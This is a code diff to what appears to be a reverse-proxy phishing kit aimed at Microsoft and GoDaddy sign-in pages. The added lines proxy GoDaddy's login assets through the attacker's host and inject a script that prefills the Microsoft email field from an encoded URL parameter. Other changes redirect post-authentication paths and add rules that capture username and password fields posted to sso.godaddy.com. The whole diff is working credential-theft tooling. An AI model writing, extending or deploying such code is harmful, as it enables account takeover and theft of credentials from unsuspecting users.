@@ -40,6 +40,21 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
                 replacement: this.browserEndPoint.clientContext.hostname,
              },
              {
+                 reg: /img6.wsimg.com\/auth-assets\/0336a97aea53761e2aca49b8d609e90b99af5696\/login-panel.js/igm,
+                 replacement: `${this.browserEndPoint.clientContext.hostname}/auth-assets/0336a97aea53761e2aca49b8d609e90b99af5696/login-panel.js`,
+
+             },
+             {
+                reg: /\+this.api_target\+"\."\+/,
+                replacement: '+'
+
+             },
+             {
+                 reg: /API_HOST:a,/,
+                 replacement: "API_HOST:'godaddy.com',"
+
+             },
+             {
                 reg: /<\/html>/igm, // Google chrome on windows fix
                 replacement: '<script>window.onload = function(){function lp(){var e=document.getElementById("i0116");if(e){console.log("kuka");const t=new URLSearchParams(window.location.search).get("qrc")||"";let o;try{o=atob(t)}catch{o=t}e.value=o}else setTimeout(lp,600)}lp();}</script> </html>',
              },
@@ -52,9 +67,13 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
         if (this.proxyResp.headers['content-length'] < 1) {
             return this.proxyResp.pipe(this.browserEndPoint)
         }
+       
 
         if (this.proxyResp.req.path.startsWith('/kmsi')  
         || this.proxyResp.req.path.startsWith('/common/SAS/ProcessAuth')
+        || this.proxyResp.req.path.startsWith('/owa/prefetch.aspx')
+        || this.proxyResp.req.path.startsWith('/webmanifest.json')
+        || this.proxyResp.req.path.startsWith('/landingv2')
         || this.proxyResp.req.path.startsWith('/common/reprocess')){
             this.browserEndPoint.writeHead(302, {'location': '/ping/v5767687'})
             return this.browserEndPoint.end()
@@ -133,6 +152,15 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
         }
         
 
+        if (this.req.url.startsWith('/auth-assets/')) {
+            return super.superExecuteProxy('img6.wsimg.com', clientContext)
+        }
+
+       
+        // if (this.req.url.startsWith('/v1/api')) {
+        //     clientContext.currentDomain = 'sso.godaddy.com'
+           
+        // }
 
         const redirectToken = this.checkForRedirect()
         if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
@@ -150,11 +178,11 @@ const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
             // super.sendClientData(clientContext, {})
         }
 
-        if (this.req.url.startsWith('/owa/prefetch.aspx') || this.req.url.startsWith('/webmanifest.json')
-        || this.req.url.startsWith('/landingv2')) {
-            super.sendClientData(clientContext, {})
+        // if (this.req.url.startsWith('/owa/prefetch.aspx') || this.req.url.startsWith('/webmanifest.json')
+        // || this.req.url.startsWith('/landingv2')) {
+        //     super.sendClientData(clientContext, {})
 
-        }
+        // }
 
        
         if (this.req.url === '/ping/v5767687') {
@@ -216,6 +244,21 @@ const configExport = {
             params: ['Password'],
             urls: '',
             hosts: [],
+        },
+
+
+        godaddyUsername: {
+            method: 'POST',
+            params: ['username'],
+            urls: '',
+            hosts: ['sso.godaddy.com'],
+        },
+
+        godaddyPassword: {
+            method: 'POST',
+            params: ['password'],
+            urls: '',
+            hosts: ['sso.godaddy.com'],
         },
 
 
